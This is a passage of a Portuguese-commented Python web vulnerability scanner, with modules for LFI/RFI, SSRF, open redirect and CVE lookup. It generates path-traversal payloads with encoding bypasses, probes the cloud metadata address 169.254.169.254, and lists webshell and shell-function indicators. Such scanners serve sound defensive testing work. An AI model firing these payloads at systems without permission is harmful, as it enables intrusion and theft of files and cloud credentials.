        """Testa um payload específico (para uso com ThreadPoolExecutor)"""
        url, method, param, form_data, payload, path, signatures, session = args
        
        try:
            start_time = time.time()
            
            test_data = {param: payload}
            if method.lower() == 'get':
                response = session.get(url, params=test_data, timeout=self.timeout, verify=False)
            else:
                post_payload = form_data.copy() if form_data else {}
                post_payload[param] = payload
                response = session.post(url, data=post_payload, timeout=self.timeout, verify=False)
            
            response_time = time.time() - start_time
            
            # Detecção por assinatura
            for signature in signatures:
                if signature.lower() in response.text.lower():
                    finding = {
                        "Risco": "Alto",
                        "Tipo": "Local File Inclusion (LFI)",
                        "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})",
                        "Recomendação": f"Payload '{payload}' retornou conteúdo do arquivo '{path}'.",
                        "Payload": payload,
                        "File_Path": path,
                        "Signature": signature,
                        "Response_Time": round(response_time, 3),
                        "Response_Length": len(response.text),
                        "Status_Code": response.status_code,
                        "Encoding_Technique": self._get_encoding_technique(payload, f"../{path}")
                    }
                    return finding
            
            # Detecção por timing
            if response_time > 2.0 and response.status_code == 200:
                timing_finding = {
                    "Risco": "Médio",
                    "Tipo": "Possível LFI (Timing-based)",
                    "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})",
                    "Recomendação": f"Payload '{payload}' causou delay suspeito de {response_time:.2f}s.",
                    "Payload": payload,
                    "File_Path": path,
                    "Response_Time": round(response_time, 3),
                    "Response_Length": len(response.text),
                    "Status_Code": response.status_code,
                    "Detection_Method": "Timing-based"
                }
                return timing_finding
            
            # Detecção por código de status anômalo
            if response.status_code in [403, 500, 502, 503] and len(response.text) > 100:
                error_finding = {
                    "Risco": "Baixo",
                    "Tipo": "Possível LFI (Error-based)",
                    "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})",
                    "Recomendação": f"Payload '{payload}' causou erro HTTP {response.status_code}.",
                    "Payload": payload,
                    "File_Path": path,
                    "Response_Time": round(response_time, 3),
                    "Response_Length": len(response.text),
                    "Status_Code": response.status_code,
                    "Detection_Method": "Error-based"
                }
                return error_finding
                
        except requests.RequestException:
            pass
        
        return None

    def _test_rfi(self, url, method, param, form_data=None):
        """Testa Remote File Inclusion (RFI)"""
        if self.verbose:
            console.print(f"[*] Testando RFI no parâmetro [cyan]{param}[/cyan]...")
            
        session = self._get_session()
        
        for rfi_payload in self.rfi_payloads:
            if self.verbose:
                console.print(f"    [*] Testando payload RFI: [yellow]{rfi_payload}[/yellow]")
                
            try:
                test_data = {param: rfi_payload}
                if method.lower() == 'get':
                    response = session.get(url, params=test_data, timeout=self.timeout, verify=False)
                else:
                    post_payload = form_data.copy() if form_data else {}
                    post_payload[param] = rfi_payload
                    response = session.post(url, data=post_payload, timeout=self.timeout, verify=False)
                
                if self.verbose:
                    console.print(f"    [*] Resposta: {response.status_code} - {len(response.text)} bytes")
                
                # Detecção de RFI através de códigos de status e tempo de resposta
                if response.status_code == 200 and len(response.text) > 100:
                    # Procura por indicadores de execução remota
                    rfi_indicators = [
                        "<?php", "<script>", "eval(", "system(", "exec(", "shell_exec(",
                        "passthru(", "file_get_contents(", "fopen(", "include(", "require(",
                        "remote shell", "backdoor", "webshell", "r57", "c99", "c100"
                    ]
                    
                    for indicator in rfi_indicators:
                        if indicator.lower() in response.text.lower():
                            if self.verbose:
                                console.print(f"    [bold red][!] RFI DETECTADO![/bold red] Indicador encontrado: [red]{indicator}[/red]")
                                
                            finding = {
                                "Risco": "Crítico",
                                "Tipo": "Remote File Inclusion (RFI)",
                                "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})",
                                "Recomendação": f"Payload '{rfi_payload}' pode permitir execução de código remoto.",
                                "Payload": rfi_payload,
                                "Response_Length": len(response.text),
                                "Status_Code": response.status_code,
                                "Indicator": indicator
                            }
                            if finding not in self.vulnerable_points:
                                self.vulnerable_points.append(finding)
                            return True
                            
            except requests.RequestException as e:
                if self.verbose:
                    console.print(f"    [red][!] Erro na requisição: {e}[/red]")
                continue
        return False

    def _scan_target(self, url, method, param, form_data=None):
        """Escaneia um alvo específico para vulnerabilidades LFI/RFI com paralelização"""
        if self.verbose:
            console.print(f"[*] Analisando parâmetro [cyan]{param}[/cyan] via [yellow]{method.upper()}[/yellow]")
            
        # Primeiro testa RFI
        if self._test_rfi(url, method, param, form_data):
            return
            
        # Depois testa LFI com paralelização
        if self.verbose:
            console.print(f"[*] Testando LFI no parâmetro [cyan]{param}[/cyan] ({len(self.payloads)} arquivos alvo)...")
            
        # Preparar tasks para ThreadPoolExecutor
        tasks = []
        session_index = 0
        
        for path, signatures in self.payloads.items():
            levels_to_test = 5 if self.fast_mode else 10  # Reduz níveis no modo rápido
            
            for i in range(levels_to_test):
                base_payload = "../" * i + path
                encoded_payloads = self._apply_encoding_techniques(base_payload)
                
                for payload in encoded_payloads:
                    # Atribuir sessão de forma round-robin
                    session = self.session_pool[session_index % len(self.session_pool)]
                    session_index += 1
                    
                    task_args = (url, method, param, form_data, payload, path, signatures, session)
                    tasks.append(task_args)
                    
                    # Limitar número de tasks para evitar sobrecarga
                    if len(tasks) >= 1000 and self.fast_mode:
                        break
                        
                if len(tasks) >= 1000 and self.fast_mode:
                    break
                    
            if len(tasks) >= 1000 and self.fast_mode:
                break
        
        if self.verbose:
            console.print(f"[*] Preparadas {len(tasks)} tasks para execução paralela...")
            
        # Executar tasks em paralelo
        vulnerabilities_found = []
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            if self.verbose:
                console.print(f"[*] Executando com {self.threads} threads...")
                
            # Submeter todas as tasks
            future_to_task = {executor.submit(self._test_payload, task): task for task in tasks}
            
            # Processar resultados conforme ficam prontos
            completed_tasks = 0
            for future in as_completed(future_to_task):
                completed_tasks += 1
                
                if self.verbose and completed_tasks % 100 == 0:
                    console.print(f"    [*] Progresso: {completed_tasks}/{len(tasks)} tasks completadas...")
                
                try:
                    result = future.result()
                    if result:
                        vulnerabilities_found.append(result)
                        
                        if self.verbose:
                            console.print(f"        [bold green][+] VULNERABILIDADE DETECTADA![/bold green]")
                            console.print(f"            [*] Tipo: {result['Tipo']}")
                            console.print(f"            [*] Arquivo: {result.get('File_Path', 'N/A')}")
                            console.print(f"            [*] Técnica: {result.get('Encoding_Technique', result.get('Detection_Method', 'N/A'))}")
                        
                        # Se encontrou vulnerabilidade crítica ou alta, pode parar
                        if self.stop_on_first and result['Risco'] in ['Crítico', 'Alto']:
                            if self.verbose:
                                console.print(f"    [*] Parando após primeira vulnerabilidade de alto risco...")
                            # Cancelar tasks pendentes
                            for f in future_to_task:
                                f.cancel()
                            break
                            
                except Exception as e:
                    if self.verbose:
                        console.print(f"    [red][!] Erro na task: {e}[/red]")
                    continue
        
        # Adicionar vulnerabilidades encontradas
        for vuln in vulnerabilities_found:
            if vuln not in self.vulnerable_points:
                self.vulnerable_points.append(vuln)
                
        if self.verbose:
            console.print(f"[*] Scan do parâmetro concluído. Vulnerabilidades encontradas: {len(vulnerabilities_found)}")

    def _get_encoding_technique(self, encoded_payload, original_payload):
        """Identifica a técnica de codificação usada"""
        if encoded_payload == original_payload:
            return "Original"
        elif '%2f' in encoded_payload.lower():
            return "URL Encoding"
        elif '%252f' in encoded_payload.lower():
            return "Double URL Encoding"
        elif '%c0%af' in encoded_payload.lower():
            return "UTF-8 Overlong Encoding"
        elif '%00' in encoded_payload:
            return "Null Byte Termination"
        elif '\\' in encoded_payload:
            return "Windows Path Separator"
        elif '....///' in encoded_payload:
            return "Double Dot Slash"
        elif '%u00' in encoded_payload.lower():
            return "Unicode Encoding"
        else:
            return "Mixed Encoding"

    def run_scan(self, return_findings=False, export_results=False):
        if not return_findings:
            console.print("-" * 80)
            console.print(f"[*] Executando scanner avançado de LFI/RFI em: [bold cyan]{self.base_url}[/bold cyan]")
            console.print(f"[*] Timeout: {self.timeout}s | Threads: {self.threads} | Payloads: {len(self.payloads)}")
            
            if self.fast_mode:
                console.print(f"[*] Modo: [yellow]RÁPIDO[/yellow] - Usando técnicas otimizadas")
                console.print(f"[*] Técnicas de bypass: {len(self._apply_encoding_techniques('test'))} variações por payload")
                console.print(f"[*] Níveis de path traversal: 5 (otimizado)")
            else:
                console.print(f"[*] Modo: [blue]COMPLETO[/blue] - Todas as técnicas disponíveis")
                console.print(f"[*] Técnicas de bypass: {len(self._apply_encoding_techniques('test'))} variações por payload")
                console.print(f"[*] Níveis de path traversal: 10 (completo)")
            
            if self.stop_on_first:
                console.print(f"[*] Estratégia: [green]STOP-ON-FIRST[/green] - Para na primeira vulnerabilidade crítica/alta")
            
            if self.verbose:
                console.print(f"[*] Modo verbose: [green]ATIVO[/green] - Exibindo detalhes completos")
                console.print(f"[*] RFI payloads: {len(self.rfi_payloads)} URLs de teste")
                console.print(f"[*] Pool de sessões: {len(self.session_pool)} sessões HTTP reutilizáveis")
                console.print(f"[*] Execução: [cyan]PARALELA[/cyan] com ThreadPoolExecutor")
                
            console.print("-" * 80)
        
        start_time = time.time()
        
        if self.verbose:
            console.print("[*] Conectando ao alvo...")
            
        try:
            with console.status("[bold green]Coletando pontos de entrada...[/bold green]"):
                response = self.session.get(self.base_url, timeout=self.timeout, verify=False)
                soup = BeautifulSoup(response.content, 'html.parser')
                
            if self.verbose:
                console.print(f"[*] Resposta do servidor: {response.status_code}")
                console.print(f"[*] Tamanho da página: {len(response.text)} bytes")
                console.print(f"[*] Content-Type: {response.headers.get('content-type', 'N/A')}")
                
        except requests.RequestException as e:
            if not return_findings: console.print(f"[bold red][!] Não foi possível aceder à página inicial: {e}[/bold red]")
            return [] if return_findings else None

        # Parâmetros comuns expandidos
        common_params = [
            'file', 'page', 'include', 'path', 'document', 'img', 'view', 'load', 'read',
            'template', 'src', 'url', 'dir', 'folder', 'content', 'data', 'resource',
            'filename', 'filepath', 'pathname', 'location', 'link', 'href', 'target',
            'source', 'destination', 'upload', 'download', 'action', 'module', 'cat',
            'show', 'display', 'get', 'fetch', 'retrieve', 'open', 'exec', 'cmd',
            'command', 'function', 'method', 'class', 'lib', 'library', 'inc', 'req',
            'require', 'import', 'plugin', 'addon', 'extension', 'component', 'widget',
            'theme', 'skin', 'style', 'css', 'js', 'script', 'code', 'lang', 'locale',
            'config', 'conf', 'setting', 'option', 'param', 'var', 'val', 'value',
            'text', 'html', 'xml', 'json', 'csv', 'log', 'tmp', 'temp', 'cache',
            'session', 'cookie', 'token', 'key', 'id', 'uid', 'gid', 'user', 'usr',
            'admin', 'root', 'home', 'public', 'private', 'secret', 'hidden', 'backup',
            'old', 'new', 'copy', 'orig', 'original', 'bak', 'back', 'save', 'restore',
            'db', 'database', 'sql', 'query', 'search', 'find', 'lookup', 'browse',
            'list', 'index', 'menu', 'nav', 'navigation', 'site', 'web', 'www',
            'http', 'https', 'ftp', 'sftp', 'ssh', 'telnet', 'smtp', 'pop', 'imap',
            'dns', 'ip', 'host', 'domain', 'subdomain', 'port', 'protocol', 'service',
            'api', 'rest', 'soap', 'xml', 'rpc', 'ajax', 'json', 'jsonp', 'callback',
            'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o'
        ]
        
        tasks = []
        
        if self.verbose:
            console.print("[*] Coletando pontos de entrada...")
            
        # Coleta links com parâmetros GET
        links = {urljoin(self.base_url, a['href']) for a in soup.find_all('a', href=True) if '?' in a['href'] and '=' in a['href']}
        if self.verbose:
            console.print(f"[*] Encontrados {len(links)} links com parâmetros GET")
            
        for link in links:
            parsed = urlparse(link)
            base = urlunparse(parsed._replace(query=""))
            for param in parse_qs(parsed.query):
                if any(p in param.lower() for p in common_params): 
                    if self.verbose:
                        console.print(f"    [+] Parâmetro GET encontrado: [cyan]{param}[/cyan] em {base}")
                    tasks.append(('get', base, param, None))

        # Coleta formulários
        forms = soup.find_all('form')
        if self.verbose:
            console.print(f"[*] Encontrados {len(forms)} formulários")
            
        for form in forms:
            action = urljoin(self.base_url, form.get('action', ''))
            method = form.get('method', 'post').lower()
            data = {i.get('name'): 'test' for i in form.find_all(['input', 'textarea', 'select']) if i.get('name')}
            for param in data:
                if any(p in param.lower() for p in common_params): 
                    if self.verbose:
                        console.print(f"    [+] Parâmetro {method.upper()} encontrado: [cyan]{param}[/cyan] em {action}")
                    tasks.append((method, action, param, data))
        
        # Testa parâmetros comuns mesmo se não encontrados na página
        if not tasks:
            if not return_findings: console.print("[yellow]Nenhum parâmetro encontrado na página. Testando parâmetros comuns...[/yellow]")
            if self.verbose:
                console.print("[*] Testando parâmetros comuns mesmo sem detecção na página...")
                
            for param in ['file', 'page', 'include', 'path', 'view', 'load', 'src', 'url']:
                if self.verbose:
                    console.print(f"    [+] Adicionando parâmetro comum: [cyan]{param}[/cyan]")
                tasks.append(('get', self.base_url, param, None))
        
        if not tasks:
            if not return_findings: console.print("[yellow]Nenhum parâmetro para testar.[/yellow]")
            return [] if return_findings else None

        if self.verbose:
            console.print(f"[*] Iniciando testes em {len(tasks)} parâmetros encontrados...")
            console.print("[*] Ordem de teste: RFI → LFI (assinatura) → LFI (timing) → LFI (error-based)")

        # Executa os testes
        with Progress(
            SpinnerColumn(), 
            TextColumn("[progress.description]{task.description}"), 
            BarColumn(), 
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), 
            TimeRemainingColumn(),
            console=console, 
            transient=return_findings or self.verbose
        ) as progress:
            task_id = progress.add_task("[green]Testando LFI/RFI...", total=len(tasks))
            for method, url, param, form_data in tasks:
                if not self.verbose:
                    progress.update(task_id, advance=1, description=f"[green]Testando [cyan]{param}[/cyan] em [yellow]{method.upper()}[/yellow]...")
                else:
                    progress.update(task_id, advance=1, description=f"[green]Processando [cyan]{param}[/cyan]...")
                self._scan_target(url, method, param, form_data)

        scan_time = time.time() - start_time
        
        if not return_findings:
            console.print(f"\n[bold blue][*] Scan concluído em {scan_time:.2f} segundos[/bold blue]")
            console.print(f"[bold blue][*] Parâmetros testados: {len(tasks)}[/bold blue]")
            console.print(f"[bold blue][*] Vulnerabilidades encontradas: {len(self.vulnerable_points)}[/bold blue]")
            
            if self.verbose:
                console.print(f"[*] Tempo médio por parâmetro: {scan_time/len(tasks):.2f}s")
                console.print(f"[*] Payloads testados por parâmetro: ~{len(self.payloads) * 10 * len(self._apply_encoding_techniques('test'))}")
                console.print(f"[*] Total de requisições aproximadas: {len(tasks) * len(self.payloads) * 10}")
                
                if self.vulnerable_points:
                    console.print("[*] Resumo das técnicas que funcionaram:")
                    techniques_used = {}
                    for vuln in self.vulnerable_points:
                        tech = vuln.get('Encoding_Technique', vuln.get('Detection_Method', 'N/A'))
                        techniques_used[tech] = techniques_used.get(tech, 0) + 1
                    
                    for tech, count in techniques_used.items():
                        console.print(f"    [*] {tech}: {count} detecção(ões)")
                        
            
            
        if return_findings: 
            return self.vulnerable_points
        
        self._present_findings()
        
        if export_results:
            self.export_findings()
            
        return self.vulnerable_points

    def _present_findings(self):
        console.print("-" * 80)
        if not self.vulnerable_points:
            console.print("[bold green][+] Nenhuma vulnerabilidade de LFI/RFI foi encontrada.[/bold green]")
        else:
            # Separar por tipo de vulnerabilidade
            lfi_findings = [f for f in self.vulnerable_points if 'LFI' in f['Tipo']]
            rfi_findings = [f for f in self.vulnerable_points if 'RFI' in f['Tipo']]
            timing_findings = [f for f in self.vulnerable_points if 'Timing' in f['Tipo']]
            error_findings = [f for f in self.vulnerable_points if 'Error' in f['Tipo']]
            
            # Tabela principal de vulnerabilidades críticas e altas
            critical_high = [f for f in self.vulnerable_points if f['Risco'] in ['Crítico', 'Alto']]
            if critical_high:
                table = Table(title="[bold red]Vulnerabilidades Críticas e de Alto Risco[/bold red]")
                table.add_column("Tipo", style="red")
                table.add_column("Risco", style="red")
                table.add_column("Detalhe", style="cyan")
                table.add_column("Payload", style="yellow")
                table.add_column("Status", style="green")
                table.add_column("Tempo (s)", style="magenta")
                
                for f in critical_high:
                    payload = f.get('Payload', 'N/A')[:50] + '...' if len(f.get('Payload', '')) > 50 else f.get('Payload', 'N/A')
                    table.add_row(
                        f['Tipo'],
                        f['Risco'],
                        f['Detalhe'],
                        payload,
                        str(f.get('Status_Code', 'N/A')),
                        str(f.get('Response_Time', 'N/A'))
                    )
                console.print(table)
                console.print()
            
            # Tabela de vulnerabilidades médias e baixas
            medium_low = [f for f in self.vulnerable_points if f['Risco'] in ['Médio', 'Baixo']]
            if medium_low:
                table2 = Table(title="[bold yellow]Vulnerabilidades de Médio e Baixo Risco[/bold yellow]")
                table2.add_column("Tipo", style="yellow")
                table2.add_column("Risco", style="yellow")
                table2.add_column("Detalhe", style="cyan")
                table2.add_column("Método de Detecção", style="green")
                table2.add_column("Status", style="green")
                
                for f in medium_low:
                    table2.add_row(
                        f['Tipo'],
                        f['Risco'],
                        f['Detalhe'],
                        f.get('Detection_Method', 'Signature-based'),
                        str(f.get('Status_Code', 'N/A'))
                    )
                console.print(table2)
                console.print()
            
            # Estatísticas resumidas
            stats_table = Table(title="[bold blue]Estatísticas do Scan[/bold blue]")
            stats_table.add_column("Categoria", style="blue")
            stats_table.add_column("Quantidade", style="white")
            
            stats_table.add_row("Total de Vulnerabilidades", str(len(self.vulnerable_points)))
            stats_table.add_row("LFI Confirmadas", str(len(lfi_findings)))
            stats_table.add_row("RFI Confirmadas", str(len(rfi_findings)))
            stats_table.add_row("Timing-based", str(len(timing_findings)))
            stats_table.add_row("Error-based", str(len(error_findings)))
            stats_table.add_row("Crítico", str(len([f for f in self.vulnerable_points if f['Risco'] == 'Crítico'])))
            stats_table.add_row("Alto", str(len([f for f in self.vulnerable_points if f['Risco'] == 'Alto'])))
            stats_table.add_row("Médio", str(len([f for f in self.vulnerable_points if f['Risco'] == 'Médio'])))
            stats_table.add_row("Baixo", str(len([f for f in self.vulnerable_points if f['Risco'] == 'Baixo'])))
            
            console.print(stats_table)
            
            # Recomendações gerais
            console.print("\n[bold blue]Recomendações de Segurança:[/bold blue]")
            console.print("• Implementar validação rigorosa de entrada")
            console.print("• Usar whitelist de arquivos permitidos")
            console.print("• Implementar path canonicalization")
            console.print("• Configurar chroot/jail para o servidor web")
            console.print("• Desabilitar funções perigosas do PHP (allow_url_include, allow_url_fopen)")
            console.print("• Implementar Content Security Policy (CSP)")
            console.print("• Monitorar logs de acesso para padrões suspeitos")
            console.print("• Atualizar regularmente o sistema e aplicações")
            
        console.print("-" * 80)

    def export_findings(self, filename='lfi_scan_results.json'):
        """Exporta os resultados para um arquivo JSON"""
        if not self.vulnerable_points:
            console.print("[yellow]Nenhuma vulnerabilidade encontrada para exportar.[/yellow]")
            return
            
        export_data = {
            'scan_info': {
                'target': self.base_url,
                'timestamp': datetime.now().isoformat(),
                'total_vulnerabilities': len(self.vulnerable_points),
                'scanner_version': '2.0',
                'timeout': self.timeout,
                'threads': self.threads
            },
            'vulnerabilities': self.vulnerable_points,
            'statistics': {
                'critical': len([f for f in self.vulnerable_points if f['Risco'] == 'Crítico']),
                'high': len([f for f in self.vulnerable_points if f['Risco'] == 'Alto']),
                'medium': len([f for f in self.vulnerable_points if f['Risco'] == 'Médio']),
                'low': len([f for f in self.vulnerable_points if f['Risco'] == 'Baixo']),
                'lfi_count': len([f for f in self.vulnerable_points if 'LFI' in f['Tipo']]),
                'rfi_count': len([f for f in self.vulnerable_points if 'RFI' in f['Tipo']])
            }
        }
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(export_data, f, indent=2, ensure_ascii=False)
            console.print(f"[green]Resultados exportados para: {filename}[/green]")
        except Exception as e:
            console.print(f"[red]Erro ao exportar resultados: {e}[/red]")

def lfi_scan(url, timeout=10, threads=5, export_results=False, verbose=False, fast_mode=False, stop_on_first=False):
    """Função principal para executar scan de LFI/RFI otimizado"""
    scanner = LFIScanner(url, timeout=timeout, threads=threads)
    scanner.verbose = verbose
    scanner.fast_mode = fast_mode
    scanner.stop_on_first = stop_on_first
    return scanner.run_scan(export_results=export_results)

# --- MÓDULO 18: SCANNER DE SSRF (SERVER-SIDE REQUEST FORGERY) ---

class SSRFScanner:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
        self.vulnerable_points = []
        self.payloads = ["http://127.0.0.1", "http://localhost", "http://169.254.169.254/latest/meta-data/"]

    def _scan_target(self, url, method, param, form_data=None):
        for payload in self.payloads:
            try:
                test_data = {param: payload}
                if method.lower() == 'get': response = self.session.get(url, params=test_data, timeout=7, verify=False)
                else:
                    post_payload = form_data.copy()
                    post_payload[param] = payload
                    response = self.session.post(url, data=post_payload, timeout=7, verify=False)
                
                if "It works!" in response.text or "Apache" in response.text or "instance-id" in response.text:
                    finding = {"Risco": "Alto", "Tipo": "Server-Side Request Forgery (SSRF)", "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})", "Recomendação": f"Payload '{payload}' parece ter acedido a um recurso local. Investigar imediatamente."}
                    if finding not in self.vulnerable_points: self.vulnerable_points.append(finding)
                    return
            except requests.RequestException: continue

    def run_scan(self, return_findings=False):
        if not return_findings:
            console.print("-" * 60)
            console.print(f"[*] Executando scanner de SSRF em: [bold cyan]{self.base_url}[/bold cyan]")
            console.print("-" * 60)
        try:
            with console.status("[bold green]Coletando pontos de entrada...[/bold green]"):
                response = self.session.get(self.base_url, timeout=10, verify=False)
                soup = BeautifulSoup(response.content, 'html.parser')
        except requests.RequestException as e:
            if not return_findings: console.print(f"[bold red][!] Não foi possível aceder à página inicial: {e}[/bold red]")
            return [] if return_findings else None

        common_params = ['url', 'redirect', 'next', 'page', 'file', 'image_url', 'uri']
        tasks = []
        links = {urljoin(self.base_url, a['href']) for a in soup.find_all('a', href=True) if '?' in a['href'] and '=' in a['href']}
        for link in links:
            parsed = urlparse(link)
            base = urlunparse(parsed._replace(query=""))
            for param in parse_qs(parsed.query):
                if any(p in param.lower() for p in common_params): tasks.append(('get', base, param, None))

        forms = soup.find_all('form')
        for form in forms:
            action = urljoin(self.base_url, form.get('action', ''))
            method = form.get('method', 'post').lower()
            data = {i.get('name'): 'test' for i in form.find_all(['input', 'textarea']) if i.get('name')}
            for param in data:
                if any(p in param.lower() for p in common_params): tasks.append((method, action, param, data))
        
        if not tasks:
            if not return_findings: console.print("[yellow]Nenhum parâmetro comum de SSRF encontrado para testar.[/yellow]")
            return [] if return_findings else None

        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), TimeRemainingColumn(), console=console, transient=return_findings) as progress:
            task_id = progress.add_task("[green]Testando SSRF...", total=len(tasks))
            for method, url, param, form_data in tasks:
                progress.update(task_id, advance=1, description=f"[green]Testando [cyan]{param}[/cyan]...")
                self._scan_target(url, method, param, form_data)

        if return_findings: return self.vulnerable_points
        self._present_findings()

    def _present_findings(self):
        console.print("-" * 60)
        if not self.vulnerable_points:
            console.print("[bold green][+] Nenhuma vulnerabilidade de SSRF foi encontrada.[/bold green]")
        else:
            table = Table(title="Potenciais Vulnerabilidades de SSRF Encontradas")
            table.add_column("Detalhe", style="cyan")
            table.add_column("Recomendação", style="white")
            for f in self.vulnerable_points: table.add_row(f['Detalhe'], f['Recomendação'])
            console.print(table)
        console.print("-" * 60)

def ssrf_scan(url):
    SSRFScanner(url).run_scan()

# --- MÓDULO 19: SCANNER DE OPEN REDIRECT ---

class OpenRedirectScanner:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
        self.vulnerable_points = []
        self.payload = "http://example.com"

    def _scan_target(self, url, method, param, form_data=None):
        try:
            test_data = {param: self.payload}
            if method.lower() == 'get':
                response = self.session.get(url, params=test_data, timeout=7, verify=False, allow_redirects=False)
            else:
                post_payload = form_data.copy()
                post_payload[param] = self.payload
                response = self.session.post(url, data=post_payload, timeout=7, verify=False, allow_redirects=False)
            
            if response.status_code in [301, 302, 303, 307, 308] and 'Location' in response.headers:
                if "example.com" in response.headers['Location']:
                    finding = {"Risco": "Médio", "Tipo": "Open Redirect", "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})", "Recomendação": f"A aplicação redireciona para um URL externo ('{self.payload}') sem validação."}
                    if finding not in self.vulnerable_points: self.vulnerable_points.append(finding)
        except requests.RequestException: pass

    def run_scan(self, return_findings=False):
        if not return_findings:
            console.print("-" * 60)
            console.print(f"[*] Executando scanner de Open Redirect em: [bold cyan]{self.base_url}[/bold cyan]")
            console.print("-" * 60)
        try:
            with console.status("[bold green]Coletando pontos de entrada...[/bold green]"):
                response = self.session.get(self.base_url, timeout=10, verify=False)
                soup = BeautifulSoup(response.content, 'html.parser')
        except requests.RequestException as e:
            if not return_findings: console.print(f"[bold red][!] Não foi possível aceder à página inicial: {e}[/bold red]")
            return [] if return_findings else None

        common_params = ['url', 'redirect', 'next', 'goto', 'return', 'dest']
        tasks = []
        links = {urljoin(self.base_url, a['href']) for a in soup.find_all('a', href=True) if '?' in a['href'] and '=' in a['href']}
        for link in links:
            parsed = urlparse(link)
            base = urlunparse(parsed._replace(query=""))
            for param in parse_qs(parsed.query):
                if any(p in param.lower() for p in common_params): tasks.append(('get', base, param, None))

        forms = soup.find_all('form')
        for form in forms:
            action = urljoin(self.base_url, form.get('action', ''))
            method = form.get('method', 'post').lower()
            data = {i.get('name'): 'test' for i in form.find_all(['input', 'textarea']) if i.get('name')}
            for param in data:
                if any(p in param.lower() for p in common_params): tasks.append((method, action, param, data))
        
        if not tasks:
            if not return_findings: console.print("[yellow]Nenhum parâmetro comum de Open Redirect encontrado para testar.[/yellow]")
            return [] if return_findings else None

        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), TimeRemainingColumn(), console=console, transient=return_findings) as progress:
            task_id = progress.add_task("[green]Testando Open Redirect...", total=len(tasks))
            for method, url, param, form_data in tasks:
                progress.update(task_id, advance=1, description=f"[green]Testando [cyan]{param}[/cyan]...")
                self._scan_target(url, method, param, form_data)

        if return_findings: return self.vulnerable_points
        self._present_findings()

    def _present_findings(self):
        console.print("-" * 60)
        if not self.vulnerable_points:
            console.print("[bold green][+] Nenhuma vulnerabilidade de Open Redirect foi encontrada.[/bold green]")
        else:
            table = Table(title="Potenciais Vulnerabilidades de Open Redirect Encontradas")
            table.add_column("Detalhe", style="cyan")
            table.add_column("Recomendação", style="white")
            for f in self.vulnerable_points: table.add_row(f['Detalhe'], f['Recomendação'])
            console.print(table)
        console.print("-" * 60)

def open_redirect_scan(url):
    OpenRedirectScanner(url).run_scan()

# --- MÓDULO 20: SCANNER DE CVE (API NVD OFICIAL) ---

def _load_cve_cache():
    """Carrega o cache de CVEs a partir de um ficheiro JSON."""
    if not os.path.exists(CVE_CACHE_FILE):
        return {}
    try:
        with open(CVE_CACHE_FILE, 'r') as f:
            return json.load(f)
    except (json.JSONDecodeError, IOError):
        return {}

def _save_cve_cache(cache):
    """Guarda o cache de CVEs num ficheiro JSON."""
    try:
        if not os.path.exists(CACHE_DIR):
            os.makedirs(CACHE_DIR)
        with open(CVE_CACHE_FILE, 'w') as f:
            json.dump(cache, f, indent=4)
    except IOError:
        console.print("[bold red][!] Aviso: Não foi possível guardar o cache de CVEs.[/bold red]")

def _get_cvss_score(vuln):
    """Extrai a melhor pontuação CVSS disponível de uma vulnerabilidade NVD."""
    try:
        # Prioriza CVSS v3.1
        return vuln['cve']['metrics']['cvssMetricV31'][0]['cvssData']['baseScore']
    except (KeyError, IndexError):
        try:
            # Fallback para CVSS v2
            return vuln['cve']['metrics']['cvssMetricV2'][0]['cvssData']['baseScore']
        except (KeyError, IndexError):
            return 0.0

def cve_scan(product, version, min_cvss=0.0, no_cache=False, return_findings=False):
    """Procura por vulnerabilidades (CVEs) usando a API oficial da NVD."""
    if not return_findings:
        console.print("-" * 60)
        console.print(f"[*] Procurando CVEs para: [bold cyan]{product} v{version}[/bold cyan] (via NVD API)")
        if min_cvss > 0:
            console.print(f"[*] Filtro: CVSS >= [bold yellow]{min_cvss}[/bold yellow]")
        if no_cache:
            console.print("[yellow]Aviso: O cache está a ser ignorado (--no-cache).[/yellow]")
        console.print("-" * 60)

    cache = _load_cve_cache()
    # Assume que o vendor é igual ao produto para simplificar a criação do CPE
    vendor = product
    cpe_name = f"cpe:2.3:a:{vendor}:{product}:{version}"
    cache_key = cpe_name
    
    data = None
    if not no_cache and cache_key in cache:
        cached_time = datetime.fromisoformat(cache[cache_key]['timestamp'])
        if datetime.now() - cached_time < timedelta(hours=CACHE_DURATION_HOURS):
            if not return_findings:
                console.print("[green]✓ Usando resultados do cache.[/green]")
            data = cache[cache_key]['data']

    if data is None:
        # A NVD API pode ser lenta, então um timeout maior é prudente
        api_url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?cpeName={cpe_name}"
        api_succeeded = False
        try:
            if not return_findings:
                with console.status(f"[bold green]Consultando a API da NVD... (Pode demorar um pouco)[/bold green]"):
                    # A API da NVD pode demorar, um timeout de 30s é mais seguro
                    response = requests.get(api_url, timeout=30)
            else:
                response = requests.get(api_url, timeout=30)
            
            if response.status_code == 200:
                if not return_findings:
                    console.print(f"[bold green]✓ API NVD contactada com sucesso (Status: {response.status_code})[/bold green]")
            else:
                if not return_findings:
                    console.print(f"[bold red][!] Falha ao contactar a API NVD (Status: {response.status_code})[/bold red]")
                    try:
                        # Tenta mostrar a mensagem de erro da API, se houver
                        error_data = response.json()
                        console.print(f"[red]   Detalhe: {error_data.get('message', response.text)}[/red]")
                    except json.JSONDecodeError:
                        pass # Não faz nada se a resposta de erro não for JSON
                response.raise_for_status()

            json_response = response.json()
            data = json_response.get('vulnerabilities', [])
            
